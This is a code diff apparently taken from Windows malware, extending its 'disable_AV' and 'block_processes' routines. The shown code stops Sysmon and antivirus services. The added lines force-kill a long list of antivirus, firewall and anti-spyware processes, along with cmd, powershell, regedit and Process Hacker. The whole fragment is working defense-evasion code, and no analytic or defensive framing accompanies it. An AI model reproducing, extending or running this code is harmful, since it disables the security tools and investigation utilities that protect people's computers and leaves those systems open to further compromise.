@@ -326,6 +326,7 @@ def block_processes():
         "Processhacker",
         "sdclt",
         "SecurityHealthSystray",
+        
     ]
     for proc in blocked_processes:
         execute_command(f"taskkill /f /im {proc}.exe")
@@ -521,6 +522,21 @@ def disable_AV():
     execute_command("net stop SysmonDrv")
     execute_command("net stop AVP*")
     execute_command("net stop SEP*")
+    AV_processes = [
+        "a2adguard", "a2adwizard", "a2antidialer", "a2cfg", "a2cmd", "a2free", "a2guard", "a2hijackfree", "a2scan", "a2service", "a2start", "a2sys", "a2upd", "aavgapi", "aawservice", "aawtray", "ad-aware", "ad-watch", "alescan", "anvir", "ashdisp", "ashmaisv",
+        "ashserv", "ashwebsv", "aswupdsv", "atrack", "avgagent", "avgamsvr", "avgcc", "avgctrl", "avgemc", "avgnt", "avgtcpsv", "avguard", "avgupsvc", "avgw", "avkbar", "avk", "avkpop", "avkproxy", "avkservice", "avktray", "avktray", "avkwctl", "avkwctl",
+        "avmailc", "avp", "avpm", "avpmwrap", "avsched32", "avwebgrd", "avwin", "avwupsrv", "avz", "bdagent", "bdmcon", "bdnagent", "bdss", "bdswitch", "blackd", "blackice", "blink", "boc412", "boc425", "bocore", "bootwarn", "cavrid", "cavtray",
+        "ccapp", "ccevtmgr", "ccimscan", "ccproxy", "ccpwdsvc", "ccpxysvc", "ccsetmgr", "cfgwiz", "cfp", "clamd", "clamservice", "clamtray", "cmdagent", "cpd", "cpf", "csinsmnt", "dcsuserprot", "defensewall", "defensewall_serv", "defwatch", "f-agnt95", "fpavupdm", "f-prot95",
+        "f-prot", "fprot", "fsaua", "fsav32", "f-sched", "fsdfwd", "fsm32", "fsma32", "fssm32", "f-stopw", "f-stopw", "fwservice", "fwsrv", "iamstats", "iao", "icload95", "icmon", "idsinst", "idslu", "inetupd", "irsetup", "isafe", "isignup",
+        "issvc", "kav", "kavss", "kavsvc", "klswd", "kpf4gui", "kpf4ss", "livesrv", "lpfw", "mcagent", "mcdetect", "mcmnhdlr", "mcrdsvc", "mcshield", "mctskshd", "mcvsshld", "mghtml", "mpftray", "msascui", "mscifapp", "msfwsvc", "msgsys", "msssrv",
+        "navapsvc","navapw32","navlogon.dll","navstub","navw32","nisemsvr","nisum","nmain","noads","nod32krn","nod32kui","nod32ra","npfmntor","nprotect","nsmdtr","oasclnt","ofcdog","opscan","ossec-agent","outpost","paamsrv","pavfnsvr","pcclient",
+        "pccpfw", "pccwin98", "persfw", "protector", "qconsole", "qdcsfs", "rtvscan", "sadblock", "safe", "sandboxieserver", "savscan", "sbiectrl", "sbiesvc", "sbserv", "scfservice", "sched", "schedm", "scheduler daemon", "sdhelp", "serv95", "sgbhp", "sgmain", "slee503",
+        "smartfix", "smc", "snoopfreesvc", "snoopfreeui", "spbbcsvc", "sp_rsser", "spyblocker", "spybotsd", "spysweeper", "spysweeperui", "spywareguard.dll", "spywareterminatorshield", "ssu", "steganos5", "stinger", "swdoctor", "swupdate", "symlcsvc", "symundo", "symwsc", "symwscno", "tcguard", "tds2-98",
+        "tds-3", "teatimer", "tgbbob", "tgbstarter", "tsatudt", "umxagent", "umxcfg", "umxfwhlp", "umxlu", "umxpol", "umxtray", "usrprmpt", "vetmsg9x", "vetmsg", "vptray", "vsaccess", "vsserv", "wcantispy", "win-bugsfix", "winpatrol", "wrsssdk", "xcommsvr", "xfr",
+        "xp-antispy", "zegarynka", "zlclient", "winpa'rolex", "cmd", "powershell", "regedit", "Processhacker", "sdclt", "SecurityHealthSystray",
+    ]
+    for proc in AV_processes:
+        execute_command(f"taskkill /f /im {proc}.exe")
 
 
 def disable_all():
